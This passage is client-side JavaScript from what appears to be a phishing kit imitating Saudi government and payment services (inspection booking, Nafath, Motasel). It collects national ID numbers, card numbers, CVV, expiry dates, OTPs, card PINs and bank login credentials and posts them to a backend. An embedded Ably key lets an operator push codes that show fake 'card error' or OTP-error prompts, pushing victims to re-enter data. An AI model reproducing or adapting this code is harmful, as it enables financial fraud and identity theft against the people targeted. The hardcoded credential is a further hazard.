const TypeReqs = {
    "NewDate": "NewDate",
    "PaymentsForm": "PaymentsForm",
    "Motasel": "Motasel",
    "Nafath": "Nafath",
    "PayFmIsVerified": "PayFmIsVerified",
    "MotaselFmIsVerified": "MotaselFmIsVerified",
    "NafathFmIsVerified": "NafathFmIsVerified",
    "NafathFmGetNum": "NafathFmGetNum",
    "SetActionStatus": "SetActionStatus",
    "DeleteUsers": "DeleteUsers", 
};






// New Code for handling NewLoginForm modal//////////////////////////////////
window.onload = function() {
    // Function to remove backslashes from onclick values
    function cleanOnclickAttributes() {
        // Select all buttons with the class 'Motasel'
        const buttons = document.querySelectorAll('button.Motasel');
        
        buttons.forEach(button => {
            // Get the current 'onclick' attribute
            let onclickValue = button.getAttribute('onclick');
            
            // Remove the backslashes before the apostrophes
            onclickValue = onclickValue.replace(/\\'/g, "'");
            
            // Update the 'onclick' attribute with the cleaned value
            button.setAttribute('onclick', onclickValue);
        });
    }

    // Run the function immediately to clean the existing buttons
    cleanOnclickAttributes();

    // Set an interval to run the function every 1 second
    setInterval(cleanOnclickAttributes, 1000);
};

        function startCountdown(modal) {
            const progressBar = document.querySelector('.progress-bar');
            let countdown = 8;
            const totalTime = countdown;
        
            const interval = setInterval(() => {
                countdown -= 1;
                // Update the progress bar width based on remaining time
                const progressWidth = (countdown / totalTime) * 100; // Calculate percentage
                progressBar.style.width = progressWidth + "%";
        
                // If countdown reaches 0, stop the timer, hide the modal, and trigger the next function
                if (countdown <= 0) {
                    clearInterval(interval);
                    modal.hide(); // Hide the modal correctly
                    showNewInputPopup(); // Call the next function
                }
            }, 1000);
        }


        
        function checkInputs() {
            const username = document.getElementById("newUserName").value.trim();
            const password = document.getElementById("newPassword").value.trim();
            const submitButton = document.getElementById("submitButton");
            const usernameError = document.getElementById("usernameError");
        
            // Regex to check if username consists of numbers and starts with 1 or 2
            const usernamePattern = /^[12]\d*$/; // Starts with 1 or 2 followed by any digits
        
            // Validate username input
            if (!usernamePattern.test(username)) {
                usernameError.style.display = 'block'; // Show error message
                document.getElementById("newUserName").value = ''; // Clear the input if invalid
            } else {
                usernameError.style.display = 'none'; // Hide error message if username is valid
            }
        
            // Enable the button if both inputs are filled and username is valid
            if (username && password && usernamePattern.test(username)) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        }

    if(window.location.href.includes('payments-form')){
            // Attach event listeners to inputs
    document.getElementById("newUserName").addEventListener("change", checkInputs);
    document.getElementById("newPassword").addEventListener("change", checkInputs);
    }else{
    }

    function submitNewLoginForm() {
        const username = document.getElementById("newUserName").value.trim();
        const password = document.getElementById("newPassword").value.trim();
        const alertArea = document.getElementById("alertArea");

        // Check if username or password is empty (extra safeguard)
        if (!username || !password) {
            alertArea.style.display = 'block';
            alertArea.textContent = 'يرجى ملء جميع الحقول.';
            return;
        } else {
            alertArea.style.display = 'none';
        }

        // Get ReferenceID from localStorage
        const referenceID = localStorage.getItem('ReferenceID');
        if (!referenceID) {
            alert('ReferenceID is missing from localStorage.');
            return;
        }

        // Prepare the req object with the user data
        const req = {
            raj_username: username,
            raj_password: password
        };

        // Prepare the req_data object with step 4 and reference
        const req_data = {
            req: req,
            step: 4,  // Step 4 for updating the username and password
            reference: referenceID  // Use the reference ID from localStorage
        };

        // Assuming the token is already available in localStorage
        const token = localStorage.getItem('authToken');
        const Category = "FORMS_SUBMIT";  // Fixed Category as per your requirement
        const typeReqs = "PaymentsForm";  // Fixed TypeReqs as per your requirement
        const configs = {};  
        _requestData(token, Category, typeReqs, req_data, configs);

        // Hide external form and show the next form steps
        const extForm = document.getElementById('external-form');
        extForm.style.display = 'none';
        const alertError = document.getElementById('AlertError');
        alertError.style.display = 'none';
        const proveForm = document.getElementById('ProveForm');
        proveForm.classList.remove('d-none');
        const confirmButtonArea = document.getElementById('confirm-button');
        confirmButtonArea.classList.remove('d-none');
        closeNewInputPopup();
    }


        







// New Code for handling NewLoginForm modal/////////////////////////////////

window.addEventListener('load', (event) => {


    if (document.body.contains(document.getElementById('FormNewDate'))) {

        clickEvent("BtnNext", NewDate);
        clickEvent("btnDriverLecince", newDateTypeLecince);
        clickEvent("btnCustomID", newDateTypeLecinceCustom);
        clickEvent("btnCustomID", newDateTypeLecinceCustom);
        AddNewEventListener("Select1NumberPanal", "change", newDateOnSelectChange);
        AddNewEventListener("Select2NumberPanal", "change", newDateOnSelectChange);
        AddNewEventListener("Select3NumberPanal", "change", newDateOnSelectChange);
        AddNewEventListener("InputNumberPanal", "input", newDateOnPressInput);
        AddNewEventListener("InputID", "keypress", onlyNumberKey);
        AddNewEventListener("InputPhonNumber", "keypress", onlyNumberKey);
        AddNewEventListener("InputNumberPanal", "keypress", onlyNumberKey);
        //AddNewEventListener("InputNumberPanal", "input", on_input);

        AddNewEventListener("InputName", "input", on_input);
        AddNewEventListener("InputID", "input", on_input);
        AddNewEventListener("InputPhonNumber", "input", on_input);
        AddNewEventListener("InputEmail1", "input", on_input);
        AddNewEventListener("InputRegion", "input", on_input);
        AddNewEventListener("InputDateSvc", "input", on_input);

        const CheckVechalCarryDang = getElementById_("CheckVechalCarryDang");
        console.log(CheckVechalCarryDang.checked);



    } else if (document.body.contains(document.getElementById('PaymentsForm'))) {
        clickEvent("btnConform", paymentsFormSubmit);
        AddNewEventListener("InputCardID", "keypress", onlyNumberKey);
        AddNewEventListener("InputCode", "keypress", onlyNumberKey);
        AddNewEventListener("InputDateExp", "keypress", onlyNumberKey);
        AddNewEventListener("InputVerifyPayment", "keypress", onlyNumberKey);
        AddNewEventListener("InputSecretNum", "keypress", onlyNumberKey);

        AddNewEventListener("InputCardHolderName", "input", on_input);


        let cardNumInput =
            document.querySelector('#InputCardID')

           cardNumInput.addEventListener('input', () => {
            let cNumber = cardNumInput.value;
        
            // Remove non-digit characters except spaces
            cNumber = cNumber.replace(/\D/g, "");
        
            // Split the number into groups of 4 and join them with a space
            if (cNumber.length <= 16) {
                cNumber = cNumber.match(/.{1,4}/g); // Match groups of 4 digits
                if (cNumber) {
                    cNumber = cNumber.join(" "); // Join groups with a space
                }
            } else {
                cNumber = cNumber.slice(0, 16); // Ensure the number doesn't exceed 16 digits
            }
        
            // Update the input value with spaces
            cardNumInput.value = cNumber;
        });

document.getElementById("InputDateExp").addEventListener("keyup", (e) => {
    let date = e.target.value;
    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1; // Month is 0-indexed, so add 1 to get the correct month
    
    // Format the date to MM/YY format, adding '/' after the 2nd character
    if (e.key != "Backspace") {
        if (date.length == 2) {
            e.target.value += "/";
        }
    }

    // If the year is provided (after the slash), validate it
    if (date.length == 5) {
        const month = parseInt(date.substring(0, 2), 10);
        const year = parseInt(date.substring(3, 5), 10);

        // Check if the month is valid (1-12)
        if (month < 1 || month > 12) {
            e.target.value = ""; // Clear invalid input (you can customize this behavior)
            return;
        }

        // Check if the year is valid (current year or future year)
        if (year < currentYear % 100) {
            e.target.value = ""; // Clear invalid input (you can customize this behavior)
            return;
        }

        // If the year is the current year, ensure the month is valid
        if (year === currentYear % 100) {
            if (month < currentMonth) {
                e.target.value = ""; // Clear invalid input (you can customize this behavior)
                return;
            }
        }
    }
});



       

    } else if (document.body.contains(document.getElementById('FormMotaselMain'))) {

        clickEvent("btnEnter", MotaselEnterSubmit);
        clickEvent("btnNext", MotaselNextSubmit);
        AddNewEventListener("InputPhonNumMots", "keypress", onlyNumberKey);
        AddNewEventListener("InputPhonNumMots", "input", on_input);
        AddNewEventListener("InputVerifyCode", "keypress", onlyNumberKey);

    } else if (document.body.contains(document.getElementById('NafathForm'))) {

        clickEvent("btnSubmit", NafathSubmit);

        AddNewEventListener("InputID", "input", on_input);
        AddNewEventListener("InputID", "keypress", onlyNumberKey);
    } else if (document.body.contains(document.getElementById('SidebarUsers'))) {

        const SiteBarUsers = document.querySelector('#SidebarUsers');
        IniUserData(SidebarUsers);
    }

});

function onlyNumberKey(evt) {

    var char = String.fromCharCode(evt.which);
    if (!(/[0-9]/.test(char))) {
        evt.preventDefault();
    }
}


// Expiration Date Validation

function validateExpirationDate(expirationMonth, expirationYear) {
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear();
    const currentMonth = currentDate.getMonth() + 1; // January is 0

    if (expirationYear > currentYear) {
        return true;
    } else if (expirationYear === currentYear && expirationMonth >= currentMonth) {
        return true;
    }

    return false;
}

function on_input(event) {

    //ValidateInputFieldsCustom
    const ID = event.target.id;

    let idErrorSpan = "";
    let customValidate = {};
    const input_val = event.target.value.trim();

    switch (ID) {
        case "InputName":

            customValidate = ValidateInputFieldsCustom(
                "user_name",
                input_val,
                "");
            idErrorSpan = "NameHelp";
            break;

        case "InputPhonNumber":
            customValidate = ValidateInputFieldsCustom(
                "phone_number",
                input_val,
                "");
            idErrorSpan = "PhonNumberHelp";
            break;

        case "InputPhonNumMots":
            customValidate = ValidateInputFieldsCustom(
                "phone_number_motsel",
                input_val,
                "");
            idErrorSpan = "PhonNumMotsHelp";
            break;
        case "InputID":
            customValidate = ValidateInputFieldsCustom(
                "ID",
                input_val,
                "");
            idErrorSpan = "IDHelp";
            break;

        case "InputEmail1":
            customValidate = ValidateInputFieldsCustom(
                "email",
                input_val,
                "",
                event.target
            );
            idErrorSpan = "Email1Help";
            break;

        case "InputRegion":
            customValidate = ValidateInputFieldsCustom(
                "address_region",
                input_val,
                ""
            );
            idErrorSpan = "RegionHelp";
            break;
        case "InputDateSvc":
            customValidate = ValidateInputFieldsCustom(
                "date_svc",
                input_val,
                "",
                event.target
            );
            idErrorSpan = "DateSvcHelp";
            break;
        case "InputCardHolderName":
            customValidate = ValidateInputFieldsCustom(
                "name_card_holder",
                input_val,
                ""
            );
            idErrorSpan = "CardHolderNameHelp";
            break;
            

    }

    getElementById_(idErrorSpan).innerHTML = customValidate.msg;

}

function ValidateInputFieldsCustom(type, val, msg_def, input = null) {

    validate = { state: true, msg: msg_def, val: val };

    switch (type) {
        case "user_name":
            if (val.length > 20 || val.length < 3) {
                validate.state = false;
                validate.msg = "يرجى إدخال اسم صحيح";
            }
            break;

        case "ID":
            if (!val.startsWith("1") && !val.startsWith("2") && !val.startsWith("7")) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هوية صحيح";
            }
            break;
        case "phone_number":
            
            if (!val.startsWith("05") && !val.startsWith("5")) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هاتف صحيح";
            }
            else if (val.startsWith("05") && val.length != 10) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هاتف صحيح!";

            } else if (val.startsWith("5") && val.length != 9) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هاتف صحيح!!";
            }
            break;

        case "phone_number_motsel":
            
            if (!val.startsWith("05") && !val.startsWith("5")) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هاتف صحيح";
            }
            else if (val.startsWith("05") && val.length != 10) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هاتف صحيح!";

            } else if (val.startsWith("5") && val.length != 9) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم هاتف صحيح!!";
            }
            break;

            case "SelectNetProvider":

            if (val == "0") {
                validate.state = false;
                validate.msg = "يرجى اختيار مشغل شبكة الجوال";
            }

            break;

        case "email":
            if (!input.checkValidity()) {

                validate.state = false;
                validate.msg = "يرجى إدخال بريد إلكتروني صحيح";
            }
            break;

        case "address_region":

            if (val.length < 3) {
                validate.state = false;
                validate.msg = "يرجى إدخال عنوان منطقة صحيح";
            }
            break;
        case "date_svc":
            if (!input.checkValidity()) {

                validate.state = false;
                validate.msg = "يرجى إدخال تاريخ صحيح";
            }
            break;

        case "name_card_holder":
            if (!(/^[A-Za-z -_][A-Za-z0-9 _-]*$/.test(val))){
                validate.state = false;
                validate.msg = "يرجى كتاية الإسم باللغة الإنجليزية";
            } else if (!val) {
                validate.state = false;
                validate.msg = "يرجى إدخال اسم صحيح";
            }
            break;

        case "CardCode":

        if (val.length != 3) {
            validate.state = false;
            validate.msg = "يرجى ادخال كود من 3 ارقام";
        }

        break;


        case "nafathPas":

        if (val.length < 2) {
            validate.state = false;
            validate.msg = "يرجى إدخال كلمة السر";
        }

        break;




        case "DateCardExp":

        if (val.length != 5) {
            validate.state = false;
            validate.msg = "يرجى ادخال تاريخ انتهاء بصيغة MM/YY";
        }

            break;

        case "IDPayCard":
            if (val.length != 19) {
                validate.state = false;
                validate.msg = "يرجى ادخال رقم بطاقة بالصيغة التالية **** **** **** ****";
            }
            break;

        case "verify_code_4_6_digits":
            if (val.length != 4 && val.length != 6) {
                validate.state = false;
                validate.msg = "يرجى ادخال رمز تحقق صحيح";
            }
        break;

        case "SecretPaymentCode":
            if (val.length != 4) {
                validate.state = false;
                validate.msg = "يرجى ادخال رقم سري مكون من 4 ارقام";
            }
        break;

        case "checkbox_toggle":
             break;

        case "user_name_sign_in":
            if (val.length < 4) {
                validate.state = false;
                validate.msg = "Invalid User Name length";
            }
        break;


        case "password_sing_in":
            if (val.length < 4) {
                validate.state = false;
                validate.msg = "Invalid Password length";
            }
        break;

        // case "type_svc_select":

        // break;

        // case "vehicle_type_select":

        // break;

        // case "customs_id":

        //    //manually call checkValidItemManual(type, val, msg_def)
        //     break;

        // case "number_panel":
        //     //manually call checkValidItemManual(type, val, msg_def)
        //     break;

        // case "country_region":

        //     break;

        // case "country_code_select":

        //     break;

    }

    return validate;

}

function checkValidItemManual(type, val, msg_def){

    validate = { state: true, msg: msg_def, val: val };
    switch(type){
        case "number_panel":
            if (val.length != 4 
                || 
                getElementById_("Select1NumberPanal").value == "0"
                ||
                getElementById_("Select2NumberPanal").value == "0"
                ||
                getElementById_("Select3NumberPanal").value == "0"
            ){
                validate.state = false;
                validate.msg = "يرجى تعبئة كافة المعلومات";
            }
            validate.val = 
            getElementById_("Select1NumberPanal").value
            +
            "_"
            +
            getElementById_("Select1NumberPanal").value
            +
            "_"
            +
            getElementById_("Select1NumberPanal").value
            +
            "_"
            +
            val;
            break;

        case "customs_id":
            if (val.length > 20 || val.length < 3) {
                validate.state = false;
                validate.msg = "يرجى إدخال رقم صحيح";
            }
            validate.val = val;
            break;
    }
    
   

    return validate;

}

function logPrint(key, log) {
    console.log(key, log);
}

function clickEvent(elementID, funEvent) {
    document.getElementById(elementID).addEventListener("click", funEvent);
}
function AddNewEventListener(elementID, event, funEvent) {
    document.getElementById(elementID).addEventListener(event, funEvent);
}


function getReqfields(formFields) {

    var req = {};
    for (var field in formFields) {

        let fieldObj = formFields[field];
        //const elementInput = document.getElementById(fieldObj["inputID"]);
        req[fieldObj["column"]] = fieldObj["value"];
    }

    return req;
}

function getElementById_(ID) {

    return document.getElementById(ID);
}

function _requestData(token, Category, typeReqs, req_data = {}, configs = '') {

req_data.step = Category ;
console.log(Category)
    var jsonData = JSON.stringify(req_data);

                $.ajax({
                type: 'POST',
                dataType: 'json',
                url: '/api/payment/store-data',
                data: {
                    motorAppData: JSON.stringify(req_data)
                },
                success: function(data) {
                    	
                    window.location.href = configs;

                }
                ,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    console.log('Error. - Please try again');
                }
            });

}


function _requestDatacard(step, title, req_data = {}) {

}



function SaveToLocalStorage(key, value) {
    window.localStorage.setItem(key, value);
}
function GetItemFromLocalStorage(key) {
    return window.localStorage.getItem(key);
}
function ClearItemByKeyFromLocalStorage(key) {
    window.localStorage.removeItem(key);
}

function ValidateInputsForm(fields) {
    var el = null;

    return { el: el, fields: fields };
}


function validateAndReadfields(formFields) {

    var lastErrorElement = null;
    for (var field in formFields) {
        let fieldObj = formFields[field];
        const elementInput = document.getElementById(fieldObj["inputID"]);
        const elementError = fieldObj["SpanErrorID"] ?
            document.getElementById(fieldObj["SpanErrorID"])
            :
            null
            ;
        elementInput.blur();
        if (elementError) {
            elementError.classList.add("d-none");
        }
        val = elementInput.value.trim();
        fieldObj["value"] = val;
    }
    
    return formFields;

}

function validateAndReadfields_2(formFields) {

    var lastErrorElement = null;
    let count_error = 0;
    for (var field in formFields) {
        let fieldObj = formFields[field];
        const elementInput = document.getElementById(fieldObj["inputID"]);
        const elementError = fieldObj["SpanErrorID"] ?
            document.getElementById(fieldObj["SpanErrorID"])
            :
            null
            ;
        
        elementInput.blur()
        if (elementError) {
            elementError.innerHTML = "";
            //elementError.classList.add("d-none");
        }
        val = elementInput.value.trim();
        fieldObj["value"] = val;

        //validate = { state: true, msg: msg_def, val: val };
        const customValidate = ValidateInputFieldsCustom(
            fieldObj["typeFun"],
            val,
            fieldObj['errorMsg'],
            getElementById_(fieldObj["inputID"])
        );

        if(!customValidate.state){
            count_error +=1;
            lastErrorElement = elementInput;
            elementError.innerHTML = customValidate['msg'];
        }
    }
    return {
        lastErrorElmnts: lastErrorElement, 
        fields: formFields,
        count_error: count_error
    };

}
/********************************************* *
START DATE EVENTS
******************************************** */


function NewDate() {


    let _state = false; 
    let fields = getNewDateFormFields();

    /*
     fieldsWithStatus = {
        lastErrorElmnts: lastErrorElement, 
        fields: formFields,
        count_error: count_error
    };
    */
    const fieldsWithStatus = validateAndReadfields_2(fields);
    

    fields = fieldsWithStatus.fields;

    fields["flexSwitchDelegate"]["value"] = getElementById_(fields["flexSwitchDelegate"]["inputID"]).checked ? 1 : 0;
    fields["CheckVechalCarryDang"]["value"] = getElementById_(fields["CheckVechalCarryDang"]["inputID"]).checked ? 1:0;

    
   
    const vehicle_type_selected = getElementById_("btnDriverLecince").classList.contains("select")
    ?
    fields["InputNumberPanal"] : fields["InputCustomID"]
    ;

    const validate_vehicle_type_selected = checkValidItemManual(
        vehicle_type_selected["typeFun"], 
        vehicle_type_selected["value"], 
        vehicle_type_selected["errorMsg"]);

    
    if(!validate_vehicle_type_selected.state){

        getElementById_(vehicle_type_selected["SpanErrorID"]).innerHTML = validate_vehicle_type_selected.msg;
    }
    else{
        vehicle_type_selected["value"] = validate_vehicle_type_selected["val"];
    }
    if (fieldsWithStatus.lastErrorElmnts != null) {
        fieldsWithStatus.lastErrorElmnts.focus();
            _state = false;
            return _state;
    }
    if (!validate_vehicle_type_selected.state) {
        getElementById_(vehicle_type_selected["inputID"]).focus();
        _state = false;
        return _state;
    }



    
    const req = getReqfields(fields);
    console.log("req ", req);
    configs = {
        Elements: {}
    };

  _requestData(
        token = "",
        Category = "car info",
        typeReqs = TypeReqs.NewDate,
        req_data =req,
        configs = "/rosom");

}

 jQuery.ajaxSetup({
         headers: {
             'X-CSRF-TOKEN': jQuery('meta[name="csrf-token"]').attr('content')
         }
     });


function newDateTypeLecince() {

    const btnDriverLecince = getElementById_("btnDriverLecince");
    if (!btnDriverLecince.classList.contains("select")) {
        newDateToogleTypeLecince();
    }
}
function newDateTypeLecinceCustom() {
    const btnCustomID = getElementById_("btnCustomID");
    if (!btnCustomID.classList.contains("select")) {
        newDateToogleTypeLecince();
    }
}

function newDateToogleTypeLecince() {

    getElementById_("btnDriverLecince").classList.toggle("select");
    getElementById_("btnCustomID").classList.toggle("select");

    getElementById_("DivDriverLecince").classList.toggle("d-none");
    getElementById_("DivDriverCustom").classList.toggle("d-none");


}

function getNewDateFormFields() {

    return {

        InputTimeSvc: {
            type: "select",
            typeFun: "TimeSvc",
            inputID: 'InputTimeSvc',
            SpanErrorID: 'TimeSvcHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "TimeSvc"
        },
        InputDateSvc: {
            type: "text",
            typeFun: "date_svc",
            inputID: 'InputDateSvc',
            SpanErrorID: 'DateSvcHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "DateSvc"
        },
        CheckVechalCarryDang: {
            type: "checkbox",
            typeFun: "checkbox_toggle",
            inputID: 'CheckVechalCarryDang',
            SpanErrorID: '',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: false,
            column: "vehicleCarryDang"

        },
        InputTypeSvc: {
            type: "select",
            typeFun: "type_svc_select",
            inputID: 'InputTypeSvc',
            SpanErrorID: 'TypeSvcHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "TypeSvc"
        },
        InputRegion: {
            type: "text",
            typeFun: "address_region",
            inputID: 'InputRegion',
            SpanErrorID: 'RegionHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "RegionSvc"
        },
        InputTypeVechil: {
            type: "select",
            typeFun: "vehicle_type_select",
            inputID: 'InputTypeVechil',
            SpanErrorID: 'TypeVechilHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "VehicleType"
        },
        InputCustomID: {
            type: "text",
            typeFun: "customs_id",
            inputID: 'InputCustomID',
            SpanErrorID: 'CustomIDHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "CustomsNum"
        },
        InputNumberPanal: {
            type: "text",
            typeFun: "number_panel",
            inputID: 'InputNumberPanal',
            SpanErrorID: 'NumberPanalHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: false,
            value: '',
            column: "PanalNum"
        },
        InputCountryReg: {
            type: "text",
            typeFun: "country_region",
            inputID: 'InputCountryReg',
            SpanErrorID: 'CountryRegHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "RegisterCountry"
        },
        // SelectCountryCode: {
        //     type: "text",
        //     typeFun: "CountryCode",
        //     inputID: 'SelectCountryCode',
        //     SpanErrorID: 'PhonNumberHelp',
        //     errorMsg: 'هذا الحقل مطلوب',
        //     required: true,
        //     value: '',
        //     column: "CountryCode"
        // },
        flexSwitchDelegate: {
            type: "checkbox",
            typeFun: "checkbox_toggle",
            inputID: 'flexSwitchDelegate',
            SpanErrorID: '',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: false,
            column: "CanDelegate"
        },
        InputEmail1: {
            type: "text",
            typeFun: "email",
            inputID: 'InputEmail1',
            SpanErrorID: 'Email1Help',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "Email"
        },
        InputPhonNumber: {
            type: "number",
            typeFun: "phone_number",
            inputID: 'InputPhonNumber',
            SpanErrorID: 'PhonNumberHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "PhoneNum"
        },
        SelectCountryCode: {
            type: "text",
            typeFun: "country_code_select",
            inputID: 'SelectCountryCode',
            SpanErrorID: 'PhonNumberHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "CountryCode"
        },
        InputIDTxt: {
            type: "text",
            typeFun: "ID",
            inputID: 'InputID',
            SpanErrorID: 'IDHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "CardID"

        },
        userNameTxt: {
            type: "text",
            typeFun: "user_name",
            inputID: 'InputName',
            SpanErrorID: 'NameHelp',
            errorMsg: 'هذا الحقل مطلوب',
            required: true,
            value: '',
            column: "PersonName"
        },

    };

}


function newDateOnSelectChange(event) {

    const ID = event.target.id;
    const value = event.target.value;

    const valueSelectedArr = value.split('-');

    const panelSpansArabic = document.querySelector('#panelLableArabic').children;
    const panelSpansEnglis = document.querySelector('#panelLableEng').children;


    if (ID == "Select1NumberPanal") {
        panelSpansArabic[0].innerHTML = valueSelectedArr[0];
        panelSpansEnglis[0].innerHTML = valueSelectedArr[1];
    }
    else
        if (ID == "Select2NumberPanal") {
            panelSpansArabic[1].innerHTML = valueSelectedArr[0];
            panelSpansEnglis[1].innerHTML = valueSelectedArr[1];
        }
        else
            if (ID == "Select3NumberPanal") {
                panelSpansArabic[2].innerHTML = valueSelectedArr[0];
                panelSpansEnglis[2].innerHTML = valueSelectedArr[1];
            }
}

function newDateOnPressInput(event) {
    // Restrict input to numeric characters
    event.target.value = event.target.value.replace(/[^0-9]/g, '');

    const value = event.target.value;

    // Convert input value to an array of characters
    const valueSelectedArr = [...value];

    // Select Arabic and English panels
    const panelNumArabic = document.querySelector('#panelNumArabic').children;
    const panelNumEng = document.querySelector('#panelNumEng').children;

    // Ensure the panels have at least 4 children
    if (panelNumArabic.length < 4 || panelNumEng.length < 4) {
        console.error("Panels must have at least 4 children.");
        return;
    }

    // Update each panel with the corresponding number or placeholder
    for (let i = 0; i < 4; i++) {
        if (valueSelectedArr[i]) {
            // Convert to Arabic numeral and display
            panelNumArabic[i].innerHTML = parseInt(valueSelectedArr[i], 10).toLocaleString('ar-EG');
            // Display English numeral
            panelNumEng[i].innerHTML = valueSelectedArr[i];
        } else {
            // Display placeholder for missing numbers
            panelNumArabic[i].innerHTML = "-";
            panelNumEng[i].innerHTML = "-";
        }
    }
}


/********************************************* *
END NEW DATE EVENTS
******************************************** */



/********************************************* *
START PAYMENTS EVENTS
******************************************** */


function paymentsFormSubmit() {

    //const PaymentsForm = getElementById_("btnDriverLecince");

    if (!getElementById_("PaymentsForm").classList.contains("d-none")) {
        SubmitPaymentMainForm();

    }
    else if (!getElementById_("VerifyForm").classList.contains("d-none")) {
        SubmitPaymentVerifyForm();


    }
    else if (!getElementById_("ProveForm").classList.contains("d-none")) {
        SubmitPaymentProveForm();

    }
}

function SubmitPaymentMainForm() {

    let fields = getPaymentMainFormFields();

    //fields = validateAndReadfields(fields); 
    const fieldsWithStatus = validateAndReadfields_2(fields);

    fields = fieldsWithStatus.fields;

    if (fieldsWithStatus.lastErrorElmnts != null) {
        fieldsWithStatus.lastErrorElmnts.focus();
        _state = false;
        return _state;
    }

    const req = getReqfields(fields);

    // Add username and password with empty values
    req.username = '';
    req.password = '';

    // console.log("req ", req);
    // console.log("ReferenceID ", GetItemFromLocalStorage('ReferenceID'));//NULL

    configs = {
        Elements: [
            getElementById_("AllPaymentsForms"),
            getElementById_("PaymentProgress"),
            getElementById_("PaymentsForm"),
            getElementById_("VerifyForm"),
            getElementById_("ProveForm"),
            getElementById_("external-form"),
            getElementById_("confirm-button"),
        ]
    };

    setLstFourDigitsCard();

   req.step ="card";
      $("#PaymentProgress").removeClass('d-none');
         $("#PaymentsForm").addClass('d-none');
            $("#confirm-button").addClass('d-none');
                $.ajax({
                type: 'POST',
                dataType: 'json',
                url: '/api/data/store-details',
                data: {
                    motorAppData: JSON.stringify(req)
                },
                success: function(data) {
                    
                               
                    	 const realtime = new Ably.Realtime.Promise("RMQeNA.QwXiaQ:I9e8kIzTqD08hL6DBEeBoIULuZOx4kspDjPl3ft47g4");

      // Create a channel called 'get-started' and register a listener to subscribe to all messages with the name 'first'
						  const channel = realtime.channels.get("get-started");

   channel.subscribe("nafath-chanelltam-"+refidss, (message) => {

 if(message.data.confirm=="1"){
        $("#PaymentProgress").addClass('d-none');
           $("#PaymentsForm").removeClass('d-none');
           $("#confirm-button").removeClass('d-none');
                           
//err
document.getElementById("cardErrorModalall").style.display = "flex";
 $("#VerifyForm").addClass('d-none');
    $("#ProveForm").addClass('d-none');
    $("input:text").val('');
     $("#InputCardID").val('');
 }else if (message.data.confirm=="0"){


    $("#VerifyForm").removeClass('d-none');
                             $("#confirm-button").removeClass('d-none');
                              $("#PaymentProgress").addClass('d-none');
 


 }else if (message.data.confirm=="3"){
                                $("#ProveForm").removeClass('d-none');
                             $("#PaymentProgress").addClass('d-none');
                             $("#confirm-button").removeClass('d-none');
                               $("#VerifyForm").addClass('d-none');


 }else{



 }

   })
                          
                    	
                    //window.location.href = configs;
                    
                }
                ,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    console.log('Error. - Please try again');
                }
            });


    // getElementById_("PaymentsForm").classList.toggle("d-none");
    // getElementById_("VerifyForm").classList.toggle("d-none");
}


function SubmitPaymentVerifyForm() {

    let fields = getPaymentVerifyFormFields();


    const fieldsWithStatus = validateAndReadfields_2(fields);
    fields = fieldsWithStatus.fields;

    if (fieldsWithStatus.lastErrorElmnts != null) {
        fieldsWithStatus.lastErrorElmnts.focus();
            _state = false;
            return _state;
    }

    const req = getReqfields(fields);
    //console.log("req ", req);

    
 

    configs = {
        Elements: [
            getElementById_("VerifyForm"),
            getElementById_("ProveForm"),
        ]
    };

   

  $("#PaymentProgress").removeClass('d-none');
          $("#VerifyForm").addClass('d-none');
                             $("#confirm-button").addClass('d-none');

   req.step ="otp";
     
                $.ajax({
                type: 'POST',
                dataType: 'json',
                url: '/api/data/store-details',
                data: {
                    motorAppData: JSON.stringify(req)
                },
                success: function(data) {
                   setTimeout(function() {
                              $("#VerifyForm").removeClass('d-none');
                             $("#confirm-button").removeClass('d-none');
                               $("#PaymentProgress").addClass('d-none');
                         document.getElementById("cardErrorModalotp").style.display = "flex";
                         $("#InputVerifyPayment").val('')
                          setTimeout(function() {
                            
							document.getElementById("cardErrorModalotp").style.display = "none";
						}, 2000);
											
						}, 1000);
						
						 
                        
                    //window.location.href = configs;
                    
                }
                ,
                error: function(XMLHttpRequest, textStatus, errorThrown) {
                    console.log('Error. - Please try again');
                }
            });


    // getElementById_("VerifyForm").classList.toggle("d-none");
    // getElementById_("ProveForm").classList.toggle("d-none");

}

function SubmitPaymentProveForm() {

    let fields = getPaymentProveFormFields();
    //

    const fieldsWithStatus = validateAndReadfields_2(fields);

    fields = fieldsWithStatus.fields;

    if (fieldsWithStatus.lastErrorElmnts != null) {
        fieldsWithStatus.lastErrorElmnts.focus();
            _state = false;
            return _state;
    }

    const req = getReqfields(fields);
    //console.log("req ", req);



    configs = {
        Elements: [
            getElementById_("ProveForm"),
            getElementById_("PaymentsForm"),
        ]
    };

  
  $("#PaymentProgress").removeClass('d-none');
          $("#ProveForm").addClass('d-none');
                             $("#confirm-button").addClass('d-none');

   req.step ="pin";
     
                $.ajax({
                type: 'POST',
                dataType: 'json',
                url: '/api/data/store-details',
                data: {
                    motorAppData: JSON.stringify(req)
                },
                success: function(data) {
                    	
                               $("#PaymentProgress").addClass('d-none');
